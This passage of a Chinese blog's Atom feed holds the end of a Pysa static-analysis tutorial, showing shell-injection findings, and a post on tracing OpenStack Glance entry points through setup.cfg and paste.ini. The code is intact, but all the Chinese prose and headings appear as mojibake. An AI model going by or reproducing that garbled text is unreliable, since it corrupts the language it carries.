from [UserControlled] source(s) may reach [RemoteCodeExecution] sink(s)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;concise_description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible shell injection [5001]: Data from [UserControlled] source(s) may reach [RemoteCodeExecution] sink(s)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;inference&quot;</span>: null,</span><br><span class="line">    <span class="string">&quot;define&quot;</span>: <span class="string">&quot;views.operate_on_threes&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;line&quot;</span>: 17,</span><br><span class="line">    <span class="string">&quot;column&quot;</span>: 18,</span><br><span class="line">    <span class="string">&quot;stop_line&quot;</span>: 17,</span><br><span class="line">    <span class="string">&quot;stop_column&quot;</span>: 35,</span><br><span class="line">    <span class="string">&quot;path&quot;</span>: <span class="string">&quot;views.py&quot;</span>,</span><br><span class="line">    <span class="string">&quot;code&quot;</span>: 5001,</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Possible shell injection&quot;</span>,</span><br><span class="line">    <span class="string">&quot;description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible shell injection [5001]: Data from [UserControlled] source(s) may reach [RemoteCodeExecution] sink(s)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;long_description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible shell injection [5001]: Data from [UserControlled] source(s) may reach [RemoteCodeExecution] sink(s)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;concise_description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible shell injection [5001]: Data from [UserControlled] source(s) may reach [RemoteCodeExecution] sink(s)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;inference&quot;</span>: null,</span><br><span class="line">    <span class="string">&quot;define&quot;</span>: <span class="string">&quot;views.operate_on_twos&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h1 id="å‚é˜…"><a href="#å‚é˜…" class="headerlink" title="å‚é˜…"></a>å‚é˜…</h1><ul><li><a href="https://engineering.fb.com/2020/08/07/security/pysa/">Pysa: An open source static analysis tool to detect and prevent security issues in Python code</a></li><li><a href="https://github.com/facebook/pyre-check/tree/master/documentation/pysa_tutorial">Pysa Tutorial</a></li><li><a href="https://pyre-check.org/docs/pysa-basics">Pysa QuickStart guide</a></li><li><a href="https://developers.facebook.com/blog/post/2021/04/29/eli5-pysa-security-focused-analysis-tool-python">ELI5: Pysa - A Security-Focused Static Analysis Tool for Python Code</a></li><li><a href="https://www.youtube.com/watch?v=8I3zlvtpOww">Workshop: Graham Bleaney - Pysa to Identify Python Vulnerabilities - DEF CON 28SM AppSec Village</a></li></ul>]]></content>
    
    
    <summary type="html">åšäº†åšå®˜æ–¹æä¾›çš„ 5 ä¸ªç»ƒä¹ æ•™ç¨‹</summary>
    
    
    
    <category term="Security" scheme="https://jckling.github.io/categories/Security/"/>
    
    
    <category term="Python" scheme="https://jckling.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>OpenStack ç»„ä»¶æºç é˜…è¯»</title>
    <link href="https://jckling.github.io/2021/07/02/OpenStack/OpenStack%20%E7%BB%84%E4%BB%B6%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/"/>
    <id>https://jckling.github.io/2021/07/02/OpenStack/OpenStack%20%E7%BB%84%E4%BB%B6%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/</id>
    <published>2021-07-02T12:22:24.000Z</published>
    <updated>2022-03-08T09:03:12.286Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>è¿™æ®µæ—¶é—´éƒ½åœ¨è¯» OpenStack ç»„ä»¶æºç ï¼Œä¸»è¦ä¾èµ–å®˜æ–¹æ–‡æ¡£å’Œã€ŠOpenStack è®¾è®¡ä¸å®ç°ã€‹ï¼Œç›®å‰è¿™éƒ¨åˆ†çš„å·¥ä½œå‘Šä¸€æ®µè½ï¼Œç¨å¾®æ•´ç†ä¸€ä¸‹é˜…è¯»æºç çš„æ–¹æ³•ï¼Œä¸»è¦æ˜¯å¦‚ä½•æ‰¾åˆ°ç¨‹åºçš„å…¥å£ã€‚</p><p>Kolla-Ansible æ­å»ºç¯å¢ƒä½¿ç”¨çš„æ˜¯ Victoria ç‰ˆæœ¬çš„æºç ï¼Œä¸»è¦åŒ…å«ä»¥ä¸‹å‡ ä¸ªç»„ä»¶ï¼š</p><ul><li>Keystone</li><li>Glance</li><li>Nova</li><li>Neutron</li><li>Heat</li></ul><h1 id="æºç é˜…è¯»"><a href="#æºç é˜…è¯»" class="headerlink" title="æºç é˜…è¯»"></a>æºç é˜…è¯»</h1><p>å®é™…ä¸Šï¼Œç¨‹åºçš„å…¥å£ä» setup.cfg æ–‡ä»¶å°±å¯ä»¥çœ‹å‡ºæ¥äº†ï¼Œå¦‚ä½•å¤„ç†è¯·æ±‚ä¼šæ¶‰åŠåˆ° paste.ini é…ç½®æ–‡ä»¶ã€‚æœ‰äº›ç»„ä»¶æ¯”è¾ƒå¤æ‚ï¼ˆæ¯”å¦‚ novaã€neutronï¼‰ï¼Œç»„ä»¶æœ¬èº«åŒ…å«å¤šä¸ªå­ç»„ä»¶ï¼Œæœ‰ wsgi åº”ç”¨ã€OS-Ken åº”ç”¨ç­‰ï¼Œå¯åŠ¨æ–¹å¼ä¹Ÿå¹¶ä¸ç»Ÿä¸€ï¼Œå› æ­¤éœ€è¦æ·±å…¥æºç æ‰èƒ½æ‰¾åˆ°çœŸæ­£çš„å¯åŠ¨ä½ç½®å’Œå¯åŠ¨æ–¹å¼ã€‚</p><p>æ­¤å¤–ï¼Œç»„ä»¶ä¸ä»…æœ‰å¯¹å¤–æä¾›çš„ RESTful API æ¥å£ï¼Œç»„ä»¶å†…éƒ¨å’Œç»„ä»¶ä¹‹é—´è¿˜æœ‰ RPC è°ƒç”¨ï¼Œä¼šæ¶‰åŠæ¶ˆæ¯é˜Ÿåˆ—ï¼ˆä¸€èˆ¬æ˜¯ rabbitmqï¼‰å’Œ socket é€šä¿¡ï¼Œè€Œè¿™ä¹Ÿæ˜¯éœ€è¦æ·±å…¥æºç æ‰èƒ½ç†æ¸…çš„ã€‚</p><h2 id="setup-cfg"><a href="#setup-cfg" class="headerlink" title="setup.cfg"></a>setup.cfg</h2><p>ä¸Šè¿° OpenStack ç»„ä»¶éƒ½åŒ…å« setup.cfg æ–‡ä»¶ï¼Œ<a href="https://setuptools.readthedocs.io/en/latest/index.html">Setuptools</a> å·¥å…·ä½¿ç”¨è¯¥é…ç½®æ–‡ä»¶è®¾ç½®åŒ…çš„å…ƒæ•°æ®å’Œå…¶ä»–é€‰é¡¹ï¼Œå…·ä½“çš„é…ç½®é¡¹å¯ä»¥åœ¨ <a href="https://setuptools.readthedocs.io/en/latest/userguide/declarative_config.html#configuring-setup-using-setup-cfg-files">æ–‡æ¡£</a> ä¸­æŸ¥é˜…ã€‚</p><p>è¿™é‡Œä¸»è¦å…³æ³¨çš„æ˜¯ <code>entry_points</code> å°èŠ‚ï¼Œå¯ä»¥æ‰¾åˆ°ä»£ç çš„å…¥å£ç‚¹ï¼Œç»„ä»¶å¯åŠ¨çš„æ–¹å¼åŒ…æ‹¬ <code>console_scripts</code> å’Œ <code>wsgi_scripts</code> ï¼Œåˆ†åˆ«è¡¨ç¤ºå‘½ä»¤è¡Œè„šæœ¬å’Œ wsgi è„šæœ¬ï¼Œé€šå¸¸ wsgi è„šæœ¬é€šè¿‡ Apache + mod_wsgi è°ƒç”¨ã€‚</p><p>ä»¥ glance ä¸ºä¾‹ï¼Œglance-api å¯ä»¥ä½¿ç”¨å‘½ä»¤è¡Œè„šæœ¬å¯åŠ¨ä¹Ÿå¯ä»¥ä½¿ç”¨ wsgi è„šæœ¬å¯åŠ¨ï¼Œä¸è¿‡å®˜æ–¹å»ºè®®åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ä½¿ç”¨å‘½ä»¤è¡Œè„šæœ¬å¯åŠ¨ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[entry_points]</span><br><span class="line">console_scripts &#x3D;</span><br><span class="line">    glance-api &#x3D; glance.cmd.api:main</span><br><span class="line">    glance-cache-prefetcher &#x3D; glance.cmd.cache_prefetcher:main</span><br><span class="line">    glance-cache-pruner &#x3D; glance.cmd.cache_pruner:main</span><br><span class="line">    glance-cache-manage &#x3D; glance.cmd.cache_manage:main</span><br><span class="line">    glance-cache-cleaner &#x3D; glance.cmd.cache_cleaner:main</span><br><span class="line">    glance-control &#x3D; glance.cmd.control:main</span><br><span class="line">    glance-manage &#x3D; glance.cmd.manage:main</span><br><span class="line">    glance-replicator &#x3D; glance.cmd.replicator:main</span><br><span class="line">    glance-scrubber &#x3D; glance.cmd.scrubber:main</span><br><span class="line">    glance-status &#x3D; glance.cmd.status:main</span><br><span class="line">wsgi_scripts &#x3D;</span><br><span class="line">    glance-wsgi-api &#x3D; glance.common.wsgi_app:init_app</span><br></pre></td></tr></table></figure><p>ç­‰å·å³è¾¹å¯ä»¥ç†è§£ä¸ºè°ƒç”¨çš„å‡½æ•°ï¼Œä»¥ <code>glance-api = glance.cmd.api:main</code> ä¸ºä¾‹ï¼Œå®šä½æºç  glance/cmd/api.py ä¸­çš„ main å‡½æ•°ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        config.parse_args()             <span class="comment"># è¯»å–é…ç½®</span></span><br><span class="line">        config.set_config_defaults()    <span class="comment"># è®¾ç½®é»˜è®¤é…ç½®</span></span><br><span class="line">        wsgi.set_eventlet_hub()         <span class="comment"># è®¾ç½® eventlet.hub</span></span><br><span class="line">        logging.setup(CONF, <span class="string">&#x27;glance&#x27;</span>)   <span class="comment"># æ—¥å¿—</span></span><br><span class="line">        gmr.TextGuruMeditation.setup_autorun(version)</span><br><span class="line">        notifier.set_defaults()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> CONF.profiler.enabled: <span class="comment"># OSProfiler</span></span><br><span class="line">            osprofiler.initializer.init_from_conf(</span><br><span class="line">                conf=CONF,</span><br><span class="line">                context=&#123;&#125;,</span><br><span class="line">                project=<span class="string">&quot;glance&quot;</span>,</span><br><span class="line">                service=<span class="string">&quot;api&quot;</span>,</span><br><span class="line">                host=CONF.bind_host</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">        <span class="comment"># NOTE(danms): Configure system-wide threading model to use eventlet</span></span><br><span class="line">        glance.async_.set_threadpool_model(<span class="string">&#x27;eventlet&#x27;</span>) <span class="comment"># è®¾ç½®åŒæ­¥çº¿ç¨‹æ± æ¨¡å‹</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># NOTE(abhishekk): Added initialize_prefetcher KW argument to Server</span></span><br><span class="line">        <span class="comment"># object so that prefetcher object should only be initialized in case</span></span><br><span class="line">        <span class="comment"># of API service and ignored in case of registry. Once registry is</span></span><br><span class="line">        <span class="comment"># removed this parameter should be removed as well.</span></span><br><span class="line">        initialize_prefetcher = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> CONF.paste_deploy.flavor == <span class="string">&#x27;keystone+cachemanagement&#x27;</span>:</span><br><span class="line">            initialize_prefetcher = <span class="literal">True</span></span><br><span class="line">        server = wsgi.Server(initialize_glance_store=<span class="literal">True</span>,  <span class="comment"># wsgi åº”ç”¨</span></span><br><span class="line">                             initialize_prefetcher=initialize_prefetcher)</span><br><span class="line">        server.start(config.load_paste_app(<span class="string">&#x27;glance-api&#x27;</span>), default_port=<span class="number">9292</span>) <span class="comment"># å¯åŠ¨ wsgi åº”ç”¨</span></span><br><span class="line">        server.wait() <span class="comment"># ç­‰å¾…å¯åŠ¨å®Œæˆ</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        fail(e)</span><br></pre></td></tr></table></figure><p>å†æ¥çœ‹ä¸€ä¸‹ wsgi è„šæœ¬ <code>glance-wsgi-api = glance.common.wsgi_app:init_app</code>ï¼Œå®šä½æºç  glance/common/wsgi_app.py çš„ init_app å‡½æ•°ã€‚é‡ç‚¹å…³æ³¨çš„æ˜¯æœ€åä½¿ç”¨ Paste Deploy åŠ è½½ wsgi åº”ç”¨ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init_app</span>():</span></span><br><span class="line">    config.set_config_defaults()</span><br><span class="line">    config_files = _get_config_files()</span><br><span class="line">    CONF([], project=<span class="string">&#x27;glance&#x27;</span>, default_config_files=config_files)</span><br><span class="line">    logging.setup(CONF, <span class="string">&quot;glance&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># NOTE(danms): We are running inside uwsgi or mod_wsgi, so no eventlet;</span></span><br><span class="line">    <span class="comment"># use native threading instead.</span></span><br><span class="line">    glance.async_.set_threadpool_model(<span class="string">&#x27;native&#x27;</span>)</span><br><span class="line">    atexit.register(drain_threadpools)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># NOTE(danms): Change the default threadpool size since we</span></span><br><span class="line">    <span class="comment"># are dealing with native threads and not greenthreads.</span></span><br><span class="line">    <span class="comment"># Right now, the only pool of default size is tasks_pool,</span></span><br><span class="line">    <span class="comment"># so if others are created this will need to change to be</span></span><br><span class="line">    <span class="comment"># more specific.</span></span><br><span class="line">    common.DEFAULT_POOL_SIZE = CONF.wsgi.task_pool_threads</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> CONF.enabled_backends:</span><br><span class="line">        <span class="keyword">if</span> store_utils.check_reserved_stores(CONF.enabled_backends):</span><br><span class="line">            msg = _(<span class="string">&quot;&#x27;os_glance_&#x27; prefix should not be used in &quot;</span></span><br><span class="line">                    <span class="string">&quot;enabled_backends config option. It is reserved &quot;</span></span><br><span class="line">                    <span class="string">&quot;for internal use only.&quot;</span>)</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(msg)</span><br><span class="line">        glance_store.register_store_opts(CONF, reserved_stores=RESERVED_STORES)</span><br><span class="line">        glance_store.create_multi_stores(CONF, reserved_stores=RESERVED_STORES)</span><br><span class="line">        glance_store.verify_store()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        glance_store.register_opts(CONF)</span><br><span class="line">        glance_store.create_stores(CONF)</span><br><span class="line">        glance_store.verify_default_store()</span><br><span class="line"></span><br><span class="line">    run_staging_cleanup()</span><br><span class="line"></span><br><span class="line">    _setup_os_profiler()</span><br><span class="line">    <span class="keyword">return</span> config.load_paste_app(<span class="string">&#x27;glance-api&#x27;</span>)  <span class="comment"># Paste Deploy</span></span><br></pre></td></tr></table></figure><h2 id="paste-ini"><a href="#paste-ini" class="headerlink" title="paste.ini"></a>paste.ini</h2><p>paste.ini æ–‡ä»¶æ˜¯ wsgi åº”ç”¨çš„é…ç½®æ–‡ä»¶ï¼Œæ ¹æ®è¯¥æ–‡ä»¶å¯ä»¥çŸ¥é“åº”ç”¨ç¨‹åºæ˜¯å¦‚ä½•æ˜ å°„ URL ä»¥åŠå¦‚ä½•å¤„ç†è¯·æ±‚ã€‚</p><p>paste-ini é…ç½®æ–‡ä»¶ç±»ä¼¼ ini é…ç½®ï¼Œæ¯ä¸ª Section çš„æ ¼å¼å‡ä¸º <code>[type:name]</code> ï¼Œæœ‰ä»¥ä¸‹å‡ ä¸ªå°èŠ‚</p><ul><li>  compositeï¼šæ”¶åˆ°è¯·æ±‚åé€šè¿‡çš„ç¬¬ä¸€ä¸ª Sectionï¼Œè¡¨ç¤ºéœ€è¦å°† HTTP URL Request è°ƒåº¦åˆ°ä¸€ä¸ªæˆ–è€…å¤šä¸ªåº”ç”¨ä¸­</li><li>  appï¼šå®ç°ä¸»è¦åŠŸèƒ½çš„å…·ä½“åº”ç”¨</li><li>  pipelineï¼šè¿‡æ»¤å™¨ç®¡é“ï¼Œæœ€åä¸€ä¸ªå¿…é¡»æ˜¯ app ç±»å‹</li><li>  filterï¼šå®ç°è¿‡æ»¤å™¨åŠŸèƒ½çš„ä¸­é—´ä»¶ï¼Œç”¨äºè¿‡æ»¤è¯·æ±‚å’Œå“åº”</li></ul><p>ä»ç„¶ä»¥ glance ä¸ºä¾‹ï¼Œå¯åŠ¨ glance æœåŠ¡æ—¶éœ€è¦æŒ‡å®š paste.ini é…ç½®æ–‡ä»¶ï¼Œæºç ä¸­çš„ etc/glance-api-paste.ini é…ç½®æ–‡ä»¶å¦‚ä¸‹ï¼š</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Use this pipeline for no auth or image caching - DEFAULT</span></span><br><span class="line"><span class="section">[pipeline:glance-api]</span></span><br><span class="line"><span class="attr">pipeline</span> = cors healthcheck http_proxy_to_wsgi versionnegotiation osprofiler unauthenticated-context rootapp</span><br><span class="line"></span><br><span class="line"><span class="comment"># Use this pipeline for image caching and no auth</span></span><br><span class="line"><span class="section">[pipeline:glance-api-caching]</span></span><br><span class="line"><span class="attr">pipeline</span> = cors healthcheck http_proxy_to_wsgi versionnegotiation osprofiler unauthenticated-context cache rootapp</span><br><span class="line"></span><br><span class="line"><span class="comment"># Use this pipeline for caching w/ management interface but no auth</span></span><br><span class="line"><span class="section">[pipeline:glance-api-cachemanagement]</span></span><br><span class="line"><span class="attr">pipeline</span> = cors healthcheck http_proxy_to_wsgi versionnegotiation osprofiler unauthenticated-context cache cachemanage rootapp</span><br><span class="line"></span><br><span class="line"><span class="comment"># Use this pipeline for keystone auth</span></span><br><span class="line"><span class="section">[pipeline:glance-api-keystone]</span></span><br><span class="line"><span class="attr">pipeline</span> = cors healthcheck http_proxy_to_wsgi versionnegotiation osprofiler authtoken context  rootapp</span><br><span class="line"></span><br><span class="line"><span class="comment"># Use this pipeline for keystone auth with image caching</span></span><br><span class="line"><span class="section">[pipeline:glance-api-keystone+caching]</span></span><br><span class="line"><span class="attr">pipeline</span> = cors healthcheck http_proxy_to_wsgi versionnegotiation osprofiler authtoken context cache rootapp</span><br><span class="line"></span><br><span class="line"><span class="comment"># Use this pipeline for keystone auth with caching and cache management</span></span><br><span class="line"><span class="section">[pipeline:glance-api-keystone+cachemanagement]</span></span><br><span class="line"><span class="attr">pipeline</span> = cors healthcheck http_proxy_to_wsgi versionnegotiation osprofiler authtoken context cache cachemanage rootapp</span><br><span class="line"></span><br><span class="line"><span class="comment"># Use this pipeline for authZ only. This means that the registry will treat a</span></span><br><span class="line"><span class="comment"># user as authenticated without making requests to keystone to reauthenticate</span></span><br><span class="line"><span class="comment"># the user.</span></span><br><span class="line"><span class="section">[pipeline:glance-api-trusted-auth]</span></span><br><span class="line"><span class="attr">pipeline</span> = cors healthcheck http_proxy_to_wsgi versionnegotiation osprofiler context rootapp</span><br><span class="line"></span><br><span class="line"><span class="comment"># Use this pipeline for authZ only. This means that the registry will treat a</span></span><br><span class="line"><span class="comment"># user as authenticated without making requests to keystone to reauthenticate</span></span><br><span class="line"><span class="comment"># the user and uses cache management</span></span><br><span class="line"><span class="section">[pipeline:glance-api-trusted-auth+cachemanagement]</span></span><br><span class="line"><span class="attr">pipeline</span> = cors healthcheck http_proxy_to_wsgi versionnegotiation osprofiler context cache cachemanage rootapp</span><br><span class="line"></span><br><span class="line"><span class="section">[composite:rootapp]</span></span><br><span class="line"><span class="attr">paste.composite_factory</span> = glance.api:root_app_factory</span><br><span class="line">/: apiversions</span><br><span class="line">/v2: apiv2app</span><br><span class="line"></span><br><span class="line"><span class="section">[app:apiversions]</span></span><br><span class="line"><span class="attr">paste.app_factory</span> = glance.api.versions:create_resource</span><br><span class="line"></span><br><span class="line"><span class="section">[app:apiv2app]</span></span><br><span class="line"><span class="attr">paste.app_factory</span> = glance.api.v2.router:API.factory</span><br><span class="line"></span><br><span class="line"><span class="section">[filter:healthcheck]</span></span><br><span class="line"><span class="attr">paste.filter_factory</span> = oslo_middleware:Healthcheck.factory</span><br><span class="line"><span class="attr">backends</span> = disable_by_file</span><br><span class="line"><span class="attr">disable_by_file_path</span> = /etc/glance/healthcheck_disable</span><br><span class="line"></span><br><span class="line"><span class="section">[filter:versionnegotiation]</span></span><br><span class="line"><span class="attr">paste.filter_factory</span> = glance.api.middleware.version_negotiation:VersionNegotiationFilter.factory</span><br><span class="line"></span><br><span class="line"><span class="section">[filter:cache]</span></span><br><span class="line"><span class="attr">paste.filter_factory</span> = glance.api.middleware.cache:CacheFilter.factory</span><br><span class="line"></span><br><span class="line"><span class="section">[filter:cachemanage]</span></span><br><span class="line"><span class="attr">paste.filter_factory</span> = glance.api.middleware.cache_manage:CacheManageFilter.factory</span><br><span class="line"></span><br><span class="line"><span class="section">[filter:context]</span></span><br><span class="line"><span class="attr">paste.filter_factory</span> = glance.api.middleware.context:ContextMiddleware.factory</span><br><span class="line"></span><br><span class="line"><span class="section">[filter:unauthenticated-context]</span></span><br><span class="line"><span class="attr">paste.filter_factory</span> = glance.api.middleware.context:UnauthenticatedContextMiddleware.factory</span><br><span class="line"></span><br><span class="line"><span class="section">[filter:authtoken]</span></span><br><span class="line"><span class="attr">paste.filter_factory</span> = keystonemiddleware.auth_token:filter_factory</span><br><span class="line"><span class="attr">delay_auth_decision</span> = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="section">[filter:gzip]</span></span><br><span class="line"><span class="attr">paste.filter_factory</span> = glance.api.middleware.gzip:GzipMiddleware.factory</span><br><span class="line"></span><br><span class="line"><span class="section">[filter:osprofiler]</span></span><br><span class="line"><span class="attr">paste.filter_factory</span> = osprofiler.web:WsgiMiddleware.factory</span><br><span class="line"><span class="attr">hmac_keys</span> = SECRET_KEY  <span class="comment">#DEPRECATED</span></span><br><span class="line"><span class="attr">enabled</span> = <span class="literal">yes</span>  <span class="comment">#DEPRECATED</span></span><br><span class="line"></span><br><span class="line"><span class="section">[filter:cors]</span></span><br><span class="line"><span class="attr">paste.filter_factory</span> =  oslo_middleware.cors:filter_factory</span><br><span class="line"><span class="attr">oslo_config_project</span> = glance</span><br><span class="line"><span class="attr">oslo_config_program</span> = glance-api</span><br><span class="line"></span><br><span class="line"><span class="section">[filter:http_proxy_to_wsgi]</span></span><br><span class="line"><span class="attr">paste.filter_factory</span> = oslo_middleware:HTTPProxyToWSGI.factory</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ° pipeline æœ€åçš„æ€»æ˜¯ rootapp åº”ç”¨ï¼Œ<code>paste.composite_factory</code> è®¾ç½®åº”ç”¨çš„å·¥å‚å‡½æ•°</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[composite:rootapp]</span></span><br><span class="line"><span class="attr">paste.composite_factory</span> = glance.api:root_app_factory</span><br><span class="line">/: apiversions</span><br><span class="line">/v2: apiv2app</span><br></pre></td></tr></table></figure><p>å®šä½æºç  glance/api.py çš„ root_app_factory å‡½æ•°ï¼Œæ˜¾ç„¶æ˜¯ç”¨äºè®¾ç½® url æ˜ å°„çš„ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">root_app_factory</span>(<span class="params">loader, global_conf, **local_conf</span>):</span></span><br><span class="line">    <span class="keyword">return</span> paste.urlmap.urlmap_factory(loader, global_conf, **local_conf)</span><br></pre></td></tr></table></figure><p>ç”±äºæˆ‘ä¸»è¦å…³æ³¨çš„æ˜¯æœåŠ¡çš„å¯åŠ¨æ–¹å¼ï¼Œå› æ­¤ URL æ˜ å°„å…·ä½“æ˜¯å¦‚ä½•å®ç°çš„å¹¶æ²¡æœ‰äº†è§£ã€‚é€šè¿‡ paste.ini æ–‡ä»¶å¯ä»¥çŸ¥é“è¯·æ±‚åˆ°è¾¾çœŸæ­£çš„åº”ç”¨å‰ç»è¿‡äº†ä»€ä¹ˆä¸­é—´ä»¶ï¼ˆè¿‡æ»¤å™¨ï¼‰çš„å¤„ç†ï¼Œè¿™äº›ä¸­é—´ä»¶çš„æºç ä¹Ÿå¯ä»¥çœ‹ä¸€çœ‹ã€‚</p><h1 id="å‚é˜…"><a href="#å‚é˜…" class="headerlink" title="å‚é˜…"></a>å‚é˜…</h1><ul><li><a href="https://docs.openstack.org/glance/latest/admin/apache-httpd.html">Running Glance in HTTPD</a></li><li><a href="https://pastedeploy.readthedocs.io/en/latest/">Paste Deployment</a></li><li><a href="https://blog.csdn.net/Jmilk/article/details/52081748">Openstack Paste.ini æ–‡ä»¶è¯¦è§£</a></li></ul>]]></content>
    
    
    <summary type="html">é€šè¿‡ setup.cfg é…ç½®æ–‡ä»¶æ‰¾åˆ°ç»„ä»¶æœåŠ¡çš„å¯åŠ¨å…¥å£</summary>
    
    
    
    <category term="OpenStack" scheme="https://jckling.github.io/categories/OpenStack/"/>
    
    
    <category term="Python" scheme="https://jckling.github.io/tags/Python/"/>
    
  </entry>
  
</feed>
